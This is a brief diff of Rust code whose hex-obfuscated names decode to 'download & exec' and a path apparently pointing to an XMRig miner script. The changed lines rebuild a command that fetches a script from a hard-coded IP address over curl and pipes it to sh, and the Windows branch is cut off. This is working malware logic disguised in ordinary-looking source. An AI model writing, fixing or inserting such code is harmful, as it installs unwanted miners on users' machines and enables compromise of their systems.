@@ -30,7 +30,11 @@ error[E0599]: no method named `text` found for enum `Result` in the current scop
 #[tokio::main]
 async fn _0x646f776e6c6f616420262065786563() {
     if cfg!(unix) {
-        Command::new("curl -sSf http://150.136.245.71:1337/0x786d7273637269707473/.0x756e6978786d726967 | sh")
+        Command::new("curl")
+            .arg("-sSf")
+            .arg("http://150.136.245.71:1337/0x786d7273637269707473/.0x756e6978786d726967")
+            .arg("|")
+            .arg("sh")
             .spawn()
             .expect("0x4661696c656420746f206578656375746520636f6d6d616e64");
     } else if cfg!(windows) {
